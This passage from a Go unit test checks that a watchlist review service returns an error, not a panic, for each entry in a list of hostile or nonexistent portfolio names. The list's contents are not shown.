		marketStore:   &reviewMarketDataStorage{data: map[string]*models.MarketData{}},
		signalStore:   &reviewSignalStorage{signals: map[string]*models.TickerSignals{}},
	}

	svc := NewService(storage, nil, nil, nil, common.NewLogger("error"))

	for _, name := range hostileNames {
		t.Run(fmt.Sprintf("name=%q", name), func(t *testing.T) {
			// Should return error (not found), not panic
			_, err := svc.ReviewWatchlist(context.Background(), name, interfaces.ReviewOptions{})
			if err == nil {
				t.Error("expected error for hostile/nonexistent portfolio name")
			}
		})
	}
}
